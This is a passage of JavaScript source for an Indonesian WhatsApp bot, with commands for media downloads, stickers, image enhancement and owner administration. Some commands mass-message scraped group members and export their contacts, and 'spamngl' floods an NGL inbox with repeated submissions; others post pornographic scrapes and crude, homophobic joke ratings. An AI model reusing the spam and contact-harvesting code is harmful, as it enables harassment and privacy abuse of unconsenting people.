`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await oyin.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break;

case 'pushkontak2': {
if (!isCreator) return m.reply(`Khusus Owner Aja`)
if (!text) return m.reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await m.reply("Otw Boskuuu")
const groupMetadataa = !m.isGroup? await oyin.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await oyin.downloadAndSaveMediaMessage(quoted)
memk = await uploadwidipe(media)
await oyin.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await oyin.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
m.reply("Succes Boss!")
}
break;
case 'remini':
case 'hd':
case 'hd3':
case 'hd2': {
    const axios = require('axios');
    const FormData = require('form-data');
    const fs = require('fs');

    async function ihancer(buffer, { method = 1, size = 'low' } = {}) {
        try {
            const _size = ['low', 'medium', 'high'];

            if (!buffer || !Buffer.isBuffer(buffer)) throw new Error('Image buffer is required');
            if (method < 1 || method > 4) throw new Error('Available methods: 1, 2, 3, 4');
            if (!_size.includes(size)) throw new Error(`Available sizes: ${_size.join(', ')}`);

            const form = new FormData();
            form.append('method', method.toString());
            form.append('is_pro_version', 'false');
            form.append('is_enhancing_more', 'false');
            form.append('max_image_size', size);
            form.append('file', buffer, `rynn_${Date.now()}.jpg`);
            const { data } = await axios.post('https://ihancer.com/api/enhance', form, {
                headers: {
                    ...form.getHeaders(),
                    'accept-encoding': 'gzip',
                    host: 'ihancer.com',
                    'user-agent': 'Dart/3.5 (dart:io)'
                },
                responseType: 'arraybuffer'
            });

            return Buffer.from(data);
        } catch (error) {
            throw new Error(error.message);
        }
    }

    try {
        const q = m.quoted ? m.quoted : m
        let mime = (q.msg || q).mimetype || ''
        if (!/image/.test(mime)) return m.reply(`Send/Reply an Image with the caption .${command}`)

        m.reply("Enhancing, please wait...");

        const buffer = await q.download();
        const resp = await ihancer(buffer, { size: 'high' });
        await oyin.sendMessage(m.chat, { image: resp }, { quoted: m });
    } catch (error) {
        console.error(error);
        m.reply(`An error occurred: ${error.message}`);
    }
}
break;

case 'cekkontol': {
  const persen = Math.floor(Math.random() * 100) + 1
  let komentar = ''

  if (persen < 25) komentar = 'WAH MAYAN INI, BAGUS JUGA KONTOL LU BRO😹'
  else if (persen < 50) komentar = 'IRENG DIKIT JIR😹'
  else if (persen < 75) komentar = 'IRENG PEKAT😹'
  else komentar = 'JIR 100% BLACK MAMBA+HUTAN LEBAT😹'

  const teks = `
╭───[ *Cek Kontol* ]───😹
│👤 Nama: ${m.pushName}
│📊 Tingkat : *${persen}%*
│💬 Status: *${komentar}*
╰──────────────────────────✧
`

  await oyin.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break;

case 'cekgoblok': {
  const persen = Math.floor(Math.random() * 100) + 1
  let komentar = ''

  if (persen < 25) komentar = 'Wah, masih pinter dikit 😎'
  else if (persen < 50) komentar = 'Setengah goblok, setengah jenius 🧠⚡'
  else if (persen < 75) komentar = 'Goblok tapi elegan 😭'
  else komentar = 'GACOR KANG,100% GOBLOK INI MAH🔥🤣'

  const teks = `
╭───[ *Cek Goblok* ]───🤪
│👤 Nama: ${m.pushName}
│📊 Tingkat Goblok: *${persen}%*
│💬 Status: *${komentar}*
╰──────────────────────────✧
`

  await oyin.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break;

case 'cekkejantanan': {
  const persen = Math.floor(Math.random() * 100) + 1
  let komentar = ''
  if (persen < 30) komentar = 'Lembek kayak agar-agar 🥴'
  else if (persen < 60) komentar = 'Lumayan, tapi masih goyah 💪😅'
  else if (persen < 80) komentar = 'Wah, jantan sejati nih 😎🔥'
  else komentar = '100% ALPHA MODE 🔥🦁'

  const teks = `
╭───[ *Cek Kejantanan* ]───💪
│👤 Nama: ${m.pushName}
│📊 Persentase: *${persen}%*
│💬 Status: *${komentar}*
╰──────────────────────────✧
`
  await oyin.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break;

case 'cekgay': {
  const persen = Math.floor(Math.random() * 100) + 1
  let hasil = ''
  if (persen < 30) hasil = 'Aman bro 😎'
  else if (persen < 60) hasil = 'Masih normal dikit 😬'
  else if (persen < 80) hasil = 'Waduh... mulai curiga nih 😳'
  else hasil = '🫣 WAH UDH GA KE TOLONG INI,100% GAY DETECTED!!! 🌈'

  const teks = `
╭───[ *Cek Gay* ]───🌈
│👤 Nama: ${m.pushName}
│📊 Persentase: *${persen}%*
│💬 Status: *${hasil}*
╰──────────────────✧
`
  await oyin.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break;

case 'cekganteng': {
  const persen = Math.floor(Math.random() * 100) + 1
  let hasil = ''
  if (persen < 30) hasil = 'huekkk😹😹'
  else if (persen < 60) hasil = 'ga ada ganteng² nya sama sekali😹'
  else if (persen < 80) hasil = 'lumayan si😹'
  else hasil = 'ganteng bet jir😹'

  const teks = `
╭───[ *Cek Ganteng* ]───✧
│👤 Nama: ${m.pushName}
│📊 Persentase: *${persen}%*
│💬 Status: *${hasil}*
╰──────────────────✧
`
  await oyin.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break;

case 'quote sticker':
case 'qc': {
    if (!text) return m.reply("Mana Teksnya?");

    const pushname = m.pushName || m.sender.split('@')[0];

    await m.reply("⏳ Proses generate quote sticker . . .");

    let ppuser;
    try {
        ppuser = await oyin.profilePictureUrl(m.sender, 'image');
    } catch (e) {
        console.log("Gagal mengambil foto profil, menggunakan gambar default. Error:", e);
        ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png';
    }

    try {
        const json = {
            "type": "quote",
            "format": "png",
            "backgroundColor": "#FFFFFF",
            "width": 512,
            "height": 768,
            "scale": 2,
            "messages": [{
                "entities": [],
                "avatar": true,
                "from": {
                    "id": 1,
                    "name": pushname,
                    "photo": {
                        "url": ppuser
                    }
                },
                "text": text,
                "replyMessage": {}
            }]
        };

        const response = await axios.post('https://bot.lyo.su/quote/generate', json, {
            headers: { 'Content-Type': 'application/json' }
        });

        const buffer = Buffer.from(response.data.result.image, 'base64');

        await oyin.sendImageAsSticker(m.chat, buffer, m, {
            packname: global.packname || "Quote Sticker",
            author: global.author || "© Hangyodon - 2025"
        });

    } catch (error) {
        console.error("Error di perintah 'qc' saat generate/send sticker:", error);
        m.reply("Maaf, terjadi kesalahan saat membuat stiker quote. Silakan coba lagi.");
    }
}
break;

case "ai":
case "meta-ai":
case "metaai":
 if (!args.length) {
 return m.reply("Silakan masukkan pertanyaan untuk AI.\n\nContoh: *.ai Sekarang hari apa?*");
 }
 let query = encodeURIComponent(args.join(" "));
 let apiUrl3 = `https://www.laurine.site/api/ai/heckai?query=${query}`;
 try {
 let response = await fetch(apiUrl3);
 let data = await response.json();
 if (!data.status || !data.data) {
 return m.reply("❌ AI tidak dapat memberikan jawaban.");
 }
 m.reply(`🤖 *AI Response:*\n\n${data.data}`);
 } catch (error) {
 console.error(error);
 m.reply("❌ Terjadi kesalahan saat mengakses AI.");
 }
 break;

case "spamngl": {
    if (!text) return m.reply("Format: .spamngl <URL> | <pesan>");
    let [url, message] = text.split("|").map(v => v.trim());
    if (!url || !message) return m.reply("Format salah! Contoh: .spamngl https://ngl.link/kayzuganteng | Hai");

    let username;
    try {
        username = url.split('/').filter(Boolean).pop();
        if (!username) throw new Error('Username tidak ditemukan di URL!');
    } catch (err) {
        return m.reply('Error parsing username: ' + err.message);
    }

    m.reply(`*TUNGGU BENTAR LAGI GW PROSES*`);

    for (let i = 1; i <= 20; i++) {
        try {
            let res = await axios.post('https://ngl.link/api/submit', new URLSearchParams({
                username: username,
                question: message,
                deviceId: '29f168cd-25b3-471b-8eca-3adbb76b4a77',
                gameSlug: '',
                referrer: ''
            }), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });

            m.reply(`pesan berhasil terkirim!`);
        } catch (err) {
            m.reply(`Eror`);
        }
    }
}
break;

case 'addcase': {
    // Hanya creator yang bisa pakai
    if (!isCreator) return m.reply(mess.OnlyOwner)

    // Validasi input
    if (!text) return m.reply('Mana case nya')

    const fs = require('fs')
    const namaFile = './main.js'
    const caseBaru = `${text}`

    // Baca file JS
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err)
            return m.reply('Gagal membaca file.')
        }

        // Cari posisi awal case 'addcase'
        const posisiAwalGimage = data.indexOf("case 'addcase':")

        if (posisiAwalGimage !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage)
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err)
                    return m.reply('Gagal menulis ke file.')
                } else {
                    m.reply('✅ Sukses menambahkan case!')
                }
            })
        } else {
            m.reply('❌ Tidak dapat menemukan posisi penambahan case.')
        }
    })
}
break;

case 'tt2':
case 'tiktok2':
if (!args.length) return m.reply('mana link tiktoknya?\ncontoh: .tt https://vt.tiktok.com/Xnxx')
await downloadTikTok(args[0])
break


async function downloadTikTok(url) {
    try {
        await m.reply('⏳ proses bang')
        
        
        const apiUrl = `https://vinztyty.my.id/download/tiktok?url=${encodeURIComponent(url)}`
        const response = await fetch(apiUrl)
        const data = await response.json()
        
        if (data.status && data.result && data.result.video) {
            const videoUrl = data.result.video
            
            
            const videoBuffer = await fetch(videoUrl).then(res => res.buffer())
            
            
            await oyin.sendMessage(m.chat, {
                video: videoBuffer,
                caption: 'DONE BOSS'
            }, { quoted: m })
            
        } else {
            await m.reply('gagal unduh bang, coba pake tiktok1 .tt https://vt.tiktok.com/Xnxx')
        }
        
    } catch (error) {
        console.error(error)
        await m.reply('error, pake cmd .tt coba')
    }
}

case 'tiktok1':
case 'tiktok': 
case 'tt': {
  if (!q) return m.reply('mana link tiktoknya memek\n\nContoh:\n.tiktok https://vt.tiktok.com/xnxx');

  try {
    let res = await axios.get(`https://kyyokatsurestapi.my.id/downloader/tiktok?url=${encodeURIComponent(q)}`);
    if (!res.data.status || !res.data.result) return m.reply('❌ Gagal mengambil data dari API.');

    let result = res.data.result;
    let videoUrl = result.downloads?.[0] || result.videos?.[0];
    let thumb = result.images?.[0];

    if (!videoUrl) return m.reply('❌ Tidak menemukan video dari link tersebut.');

    try {
      await oyin.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: '✅ Berikut hasil download dari TikTok'
      }, { quoted: m });
    } catch {
      
      let text = `✅ *Berhasil ambil link TikTok*\n\n🎬 Video: ${videoUrl}\n`;
      if (thumb) text += `🖼️ Thumbnail: ${thumb}`;
      m.reply(text);
    }

  } catch (e) {
    console.error(e);
    m.reply('❌ Terjadi kesalahan saat memproses link TikTok.');
  }
}
break;

case 'get': {
 if (!text) return m.reply('❗ Contoh penggunaan:\n.get linknya')
 if (!/^https?:\/\//i.test(text)) return m.reply('URL harus dimulai dengan http:// atau https://')
 try {
 m.reply('🔎 Sedang mengambil halaman...')
 let res = await fetch(text)
 let html = await res.text()

 await m.reply(html)
 m.reply(`Berhasil mengambil HTML dari: ${text}`)
 } catch (err) {
 m.reply('Gagal mengambil halaman: ' + err.message)
 }
}
break;

case 'pin':
case 'pinterest': {
    if (!text) return m.reply(`Format salah, contoh: \n${prefix + command} Oline Jkt48`);
    if (budy.match(`tobrut|susu|seksi|sexy`)) return m.reply('NGAPAIN KIDSS??, INGET TUHAN DEKKK!');
    await oyin.sendMessage(m.chat, {react: {text: '⏳', key: m.key}});
    async function pinterest(query) {
        try {
            const axios = require('axios');
            const url = `https://anomali-api.vercel.app/search/pin?q=${encodeURIComponent(query)}`;
            const res = await axios.get(url);
            if (!res.data || !res.data.result) return [];
            return res.data.result.map(item => ({
                image: item.image,
                source: item.url || item.image
            }));
        } catch (err) {
            console.error(err);
            return [];
        }
    }

    let anutrest = await pinterest(text);
    if (!anutrest || anutrest.length === 0) return m.reply("Error, Foto Tidak Ditemukan");

    let selectedImages = anutrest.slice(0, 20);
    let anu = [];

    for (let i = 0; i < selectedImages.length; i++) {
        let imgsc = await prepareWAMessageMedia(
            { image: { url: selectedImages[i].image } }, 
            { upload: oyin.waUploadToServer }
        );

        anu.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `Foto ke *${i + 1}*`, 
                hasMediaAttachment: true,
                ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Lihat di Pinterest",
                        url: selectedImages[i].source
                    })
                }]
            }), 
            footer: proto.Message.InteractiveMessage.Footer.create({
                text: "© Hangyodon - 2025"
            })
        });
    }

    const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Result For- *${text}*`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: anu
                    })
                })
            }
        }
    }, {
        userJid: sender,
        quoted: m
    });
    oyin.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;

case 'addprem':
case 'addpremium': {
    if (!isCreator) return m.reply("Owner only!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} 62xxx`);

    let number = text.split("|")[0].replace(/[^0-9]/g, '');
    let ceknum = await oyin.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return m.reply("Invalid number!");

    Premium.push(number);
    fs.writeFileSync('./database/premium.json', JSON.stringify(Premium));

    m.reply("Success! User added to premium.");
}
break;

case 'delprem':
case 'delpremium': {
    if (!isCreator) return m.reply("Owner only!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} 62xxx`);

    let number = text.split("|")[0].replace(/[^0-9]/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) {
        Premium.splice(indexPremium, 1);
        fs.writeFileSync('./database/premium.json', JSON.stringify(Premium));
        m.reply("Success! User removed from premium.");
    } else {
        m.reply("User is not in the premium list.");
    }
}
break;

case "addowner": case "addown": {
    if (!isCreator) return m.reply("Owner only.");
    if (!args[0]) return m.reply(`Usage: ${command} 62xxx`);

    let number = text.replace(/[^0-9]/g, '');
    let checkNumber = await oyin.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return m.reply("Invalid number!");

    owner.push(number);
    Premium.push(number);
    fs.writeFileSync('./database/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./database/premium.json', JSON.stringify(Premium));

    m.reply("Owner added successfully.");
}
break;

case 'public': {
    if (!isCreator) return m.reply("Owner only.");
    oyin.public = true;
    m.reply("Bot set to public mode.");
}
break;

case 'private': case 'self': {
    if (!isCreator) return m.reply("Owner only.");
    oyin.public = false;
    m.reply("Bot set to private mode.");
}
break;

    case 'reactch': {
      if (!isCreator) return onlyOwn()

      const args = body.trim().split(/ +/).slice(1);
      if (args.length < 3) return m.reply("Format salah! Gunakan: .reactch,idsaluran, message_id, emoji1, emoji2");

      const formattedArgs = args.join(",").split(",");
      if (formattedArgs.length < 3) return m.reply("Format salah! Gunakan: .reactch,idsaluran,message_id,emoji1,emoji2");

      const channelId = formattedArgs[0];
      const messageId = formattedArgs[1];
      const emojis = formattedArgs.slice(2);

      try {
        for (const emoji of emojis) {
          await oyin.newsletterReactMessage(channelId, messageId, emoji);
          await new Promise(resolve => setTimeout(resolve, 1000));
        }

        m.reply(`✅ Berhasil mengirim reaksi ke pesan ${messageId} di saluran ${channelId}.\nReaksi: ${emojis.join(", ")}`);
      } catch (error) {
        console.error("Gagal mengirim reaksi:", error);
        m.reply("❌ Gagal mengirim reaksi. Pastikan ID saluran dan pesan benar.");
      }
    }
    break

case "brat": {;
             const text = q
if (!text) return m.reply(
`*[ ! ] Unexpected Command!!*
*Use:* ${prefix + command} Kayzu Sigma`);
             m.reply(`*Brat Feature Process!...*`);
const imageUrl = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`;
const inputPath = path.join(__dirname, "temp_image.jpg");
const outputPath = path.join(__dirname, "sticker.webp");

try {
const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
fs.writeFileSync(inputPath, response.data);
exec(`ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`, async (error) => {
if (error) {
console.error("Gagal mengonversi gambar:", error);
return await m.reply("Gagal membuat stiker");
}
await oyin.sendMessage(m.chat, { 
sticker: fs.readFileSync(outputPath),
}, { quoted: m });
fs.unlinkSync(inputPath);
fs.unlinkSync(outputPath);
});
} catch (error) {
console.error("Gagal membuat stiker:", error);
await m.reply("Gagal membuat stiker");
}
}
break;

case "cekidch": case "idch": {
if (!text) return m.reply(("linkchnya mana goblok"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await oyin.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Verif"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
await oyin.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break;

case "ht": case "hidetag": case "tagall": case "h":  {
if (!isCreator) return m.reply("Owner only.");
if (!text) return m.reply(`teks nya mana?`)
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
oyin.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break;

case "tes": {
  m.reply(`👋 \`\`\`Hello\`\`\` *${info}*
\`\`\`How can I help you?\`\`\`
┏━━━━━━━━━━━┓
   *COMMAND BOT* 
┗━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━┓
 .ᴍᴇɴᴜ
 ╰┈➤[ᴛᴏ ꜱᴇᴇ ᴛʜᴇ ᴍᴇɴᴜ]
 .ᴀʟʟᴍᴇɴᴜ 
 ╰┈➤[ᴛᴏ ꜱᴇᴇ ᴛʜᴇ ᴀʟʟᴍᴇɴᴜ]
┗━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━┓
 *OWNER : 6288983105522*
┗━━━━━━━━━━━━━━━┛`)
}
break;

case "p":
case "pp":
case "ppp": {
  m.reply(`*LEBIH BAIK UCAPKAN SALAM DARIPADA [ P ]*`)
}
break;

case "salam":
case "assalamualaikum": {
  m.reply(`*Waalaikumsalam*
\`\`\`Ada Yang Bisa Saya bantu?\`\`\`
┏━━━━━━━━━━━┓
   *COMMAND BOT* 
┗━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━┓
 .ᴍᴇɴᴜ
 ╰┈➤[ᴛᴏ ꜱᴇᴇ ᴛʜᴇ ᴍᴇɴᴜ]
 .ᴀʟʟᴍᴇɴᴜ 
 ╰┈➤[ᴛᴏ ꜱᴇᴇ ᴛʜᴇ ᴀʟʟᴍᴇɴᴜ]
┗━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━┓
 *OWNER : 6288983105522*
┗━━━━━━━━━━━━━━━┛`)
}
break;

case "play":{            
                if (!text) return m.reply(`\n*ex:* ${prefix + command} impossible\n`)
                m.reply(`*\`SEBENTAR YA KAK.\`*`)
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                oyin.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: m })
            }
            break;         
            
case "enchard": case "enc": {
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.caption
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*Shaa/*^/*($break)*/" + 
            "/*Shaa/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await oyin.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break;


case 'hentai': {
 oyin.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
async function scrapeData() {
    try {
const page = Math.floor(Math.random() * 50);
        const { data } = await axios.get('https://e-hentai.org/tag/random?prev=' + page);
        const $ = cheerio.load(data);
        const results = [];
        $('.glthumb').each((index, element) => {
            const img = $(element).find('img');
            const imgSrc = img.attr('data-src');
            
            if (imgSrc) {
                results.push(imgSrc);
            }
        });
        return results
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}
function getRandomElement(array) {
    const randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}
const jmebut = await scrapeData()
const randomUrl = getRandomElement(jmebut);
oyin.sendMessage(m.chat, { caption: m.success, image: { url: randomUrl } }, { quoted: m })
  } catch (error) {
    return m.reply(`💥 Terjadi kesalahan saat mengambil data: ${error.message}`);
  }
}
break;  
case 'tourl' : {
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const q = m.quoted ? m.quoted : m;
 const mimetype = (q.msg || q).mimetype || q.mediaType || '';
 if (!/webp/.test(mimetype)) {
 oyin.sendMessage(m.chat, {
 react: {
 text: '🕒',
 key: m.key,
 }
 });

 try {
 const media = await q.download?.();
 const fileSizeInBytes = media.length;
 const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
 const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
 const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
 const form = new FormData();
 form.append('reqtype', 'fileupload');
 let ext = mimetype.split('/')[1] || '';
 if (ext) ext = `.${ext}`;
 form.append('fileToUpload', media, `file${ext}`);
 const res = await fetch('https://catbox.moe/user/api.php', {
 method: 'POST',
 body: form
 });
 const result = await res.text();
 const url = result.trim();
 const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
 // Tombol interaktif
            const teks = caption;
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            body: {
                                text: teks
                            },
                            footer: {
                                text: "© Hangyodon - 2025"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text": "SALIN LINK","copy_code": "${url}"}`
                                    },
                                ],
                            },
                        },
                    },
                },
            }, { quoted: m });

            await oyin.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
 
 } catch (e) {
 console.error(e);
 m.reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
 }
 } else {
 m.reply(`File *.webp* tidak didukung. Kirim atau reply file lain dengan caption *${prefix + command}*`);
 }
};
 break

async function CatBox(filePath) {
	try {
		const fileStream = fs.createReadStream(filePath);
		const formData = new BodyForm();
		formData.append('fileToUpload', fileStream);
		formData.append('reqtype', 'fileupload');
		formData.append('userhash', '');
		const response = await axios.post('https://catbox.moe/user/api.php', formData, {
			headers: {
				...formData.getHeaders(),
			},
		});
		return response.data;
	} catch (error) {
		console.error("Error at Catbox uploader:", error);
		return "Terjadi kesalahan saat upload ke Catbox.";
	}
};
// END CASE MD/ADD

default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});